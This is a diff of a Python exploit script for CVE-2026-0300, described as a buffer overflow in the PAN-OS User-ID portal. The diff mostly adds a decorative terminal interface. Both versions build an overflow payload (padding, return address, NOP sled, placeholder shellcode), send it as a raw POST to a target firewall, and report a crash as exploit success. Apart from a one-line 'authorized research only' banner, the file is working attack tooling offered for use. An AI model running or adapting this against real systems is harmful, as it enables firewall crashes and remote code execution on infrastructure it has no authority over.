@@ -5,82 +5,105 @@ import argparse
 import sys
 import time
 
-# ANSI Escape Codes for Colors (Zero-Dependency)
+# --- ANSI UI TOOLKIT ---
 R = "\033[31m"  # Red
 G = "\033[32m"  # Green
 Y = "\033[33m"  # Yellow
 B = "\033[34m"  # Blue
 C = "\033[36m"  # Cyan
-W = "\033[0m"   # White/Reset
+M = "\033[35m"  # Magenta
+W = "\033[0m"   # Reset
+BOLD = "\033[1m"
 
 def print_banner():
     banner = f"""
-{C}########################################################
-#                                                      #
-#   {R}CVE-2026-0300: PAN-OS User-ID Portal Research PoC{C}  #
-#   {Y}CWE-787: Out-of-bounds Write (Buffer Overflow){C}    #
-#                                                      #
-########################################################{W}
+{C}┌────────────────────────────────────────────────────────┐
+│ {BOLD}{W}CVE-2026-0300: {R}PAN-OS User-ID Portal Research Tool{C}      │
+│ {Y}Vulnerability: CWE-787 Out-of-bounds Write (RCE)       {C}│
+└────────────────────────────────────────────────────────┘{W}
     """
     print(banner)
 
-def build_payload(offset, ret_addr):
-    print(f"[{B}*{W}] Building research payload...")
-    padding = b"A" * offset
-    try:
-        return_address = struct.pack("<Q", int(ret_addr, 16))
-    except Exception:
-        print(f"[{R}!{W}] Invalid Return Address format!")
-        sys.exit(1)
-        
-    nop_sled = b"\x90" * 64
-    shellcode = b"\xcc" * 128  # INT3 Breakpoint for Debugging
-    return padding + return_address + nop_sled + shellcode
+def loading_animation(duration=2):
+    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        for char in chars:
+            sys.stdout.write(f'\r{B}[{char}]{W} Processing...')
+            sys.stdout.flush()
+            time.sleep(0.1)
+    sys.stdout.write('\r' + ' ' * 30 + '\r')
 
-def send_exploit(target, port, payload):
-    print(f"[{B}*{W}] Target: {G}{target}:{port}{W}")
-    request = (
-        b"POST /php/login.php HTTP/1.1\r\n"
-        b"Host: " + target.encode() + b"\r\n"
-        b"User-Agent: Mozilla/5.0 (Security Research Agent)\r\n"
-        b"Content-Type: application/x-www-form-urlencoded\r\n"
-        b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
-        b"Connection: close\r\n"
-        b"\r\n" + payload
-    )
-
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(10)
-            print(f"[{Y}i{W}] Connecting to target...")
-            s.connect((target, port))
-            print(f"[{G}+{W}] Connection established! Sending buffer...")
-            s.sendall(request)
-            time.sleep(1)
-            print(f"[{B}*{W}] Data delivered. Checking for service crash...")
-            try:
-                response = s.recv(1024)
-                if not response:
-                    print(f"[{R}!{W}] Service closed connection. {G}Potential Overflow Success!{W}")
-                else:
-                    print(f"[{Y}!{W}] Service responded. It might be patched or mitigated.")
-            except socket.timeout:
-                print(f"[{R}!{W}] Timeout! Service unresponsive. {G}Likely Crashed (Exploit Worked).{W}")
-    except Exception as e:
-        print(f"[{R}x{W}] Connection failed: {e}")
+def print_status(icon, color, message):
+    print(f"{color}[{icon}]{W} {message}")
 
 def main():
     print_banner()
     parser = argparse.ArgumentParser(description="Professional PoC for CVE-2026-0300 Research")
-    parser.add_argument("-t", "--target", required=True, help="IP address of the target firewall")
+    parser.add_argument("-t", "--target", required=True, help="Target IP Address")
     parser.add_argument("-p", "--port", type=int, default=6082, help="Port (Default: 6082)")
-    parser.add_argument("-o", "--offset", type=int, default=2048, help="Buffer offset")
-    parser.add_argument("-r", "--ret", default="0xdeadbeef", help="Hex Return Address")
+    parser.add_argument("-o", "--offset", type=int, default=2048, help="Buffer Offset")
+    parser.add_argument("-r", "--ret", default="0xdeadbeef", help="Return Address (Hex)")
     args = parser.parse_args()
 
-    print(f"{R}WARNING: THIS IS FOR AUTHORIZED EDUCATIONAL RESEARCH ONLY.{W}\n")
-    payload = build_payload(args.offset, args.ret)
-    send_exploit(args.target, args.port, payload)
+    print(f"{BOLD}{R}![SECURITY WARNING]: AUTHORIZED RESEARCH ONLY{W}\n")
+    
+    # Payload Construction
+    print_status("*", B, "Constructing memory corruption buffer...")
+    padding = b"A" * args.offset
+    try:
+        return_address = struct.pack("<Q", int(args.ret, 16))
+    except Exception:
+        print_status("!", R, "Critical: Invalid Return Address format!")
+        sys.exit(1)
+        
+    payload = padding + return_address + (b"\x90" * 64) + (b"\xcc" * 128)
+    
+    request = (b"POST /php/login.php HTTP/1.1\r\n"
+               b"Host: " + args.target.encode() + b"\r\n"
+               b"Content-Type: application/x-www-form-urlencoded\r\n"
+               b"Content-Length: " + str(len(payload)).encode() + b"\r\n\r\n" + payload)
+
+    print(f"{M}───[ SESSION START ]───{W}")
+    print_status("i", C, f"Target Node: {G}{args.target}:{args.port}{W}")
+    
+    try:
+        loading_animation(1.5)
+        with socket.create_connection((args.target, args.port), timeout=15) as s:
+            print_status("+", G, "Handshake Successful! Connection established.")
+            
+            print_status(">", Y, "Injecting 0-day research payload into memory...")
+            s.sendall(request)
+            
+            print_status("*", B, "Payload sent. Synchronizing with service state...")
+            time.sleep(2)
+            
+            try:
+                response = s.recv(1024)
+                print(f"\n{BOLD}{C}┌─[ ANALYSIS RESULT ]{W}")
+                if not response:
+                    print(f"│ Status: {G}SUCCESS / POTENTIAL CRASH{W}")
+                    print(f"│ Details: Service closed connection (Vulnerable state detected).")
+                else:
+                    print(f"│ Status: {Y}MITIGATED / PATCHED{W}")
+                    print(f"│ Details: Server responded. Buffer may have been handled.")
+                print(f"{C}└────────────────────{W}")
+            except socket.timeout:
+                print(f"\n{BOLD}{C}┌─[ ANALYSIS RESULT ]{W}")
+                print(f"│ Status: {G}EXPLOIT SUCCESS (TIMEOUT){W}")
+                print(f"│ Details: Target service crashed and is now unresponsive.")
+                print(f"{C}└────────────────────{W}")
+
+    except ConnectionRefusedError:
+        print(f"\n{R}{BOLD}[X] ERROR: CONNECTION REFUSED{W}")
+        print(f"[-] Root Cause: Port {args.port} is closed or service is offline.")
+    except socket.timeout:
+        print(f"\n{R}{BOLD}[X] ERROR: NETWORK TIMEOUT{W}")
+        print(f"[-] Root Cause: Packet drop. Check firewall (WAF/ACL) settings.")
+    except Exception as e:
+        print(f"\n{R}[!] UNEXPECTED FAULT: {e}{W}")
+
+    print(f"\n{M}───[ SESSION END ]───{W}")
 
 if __name__ == "__main__":
     main()
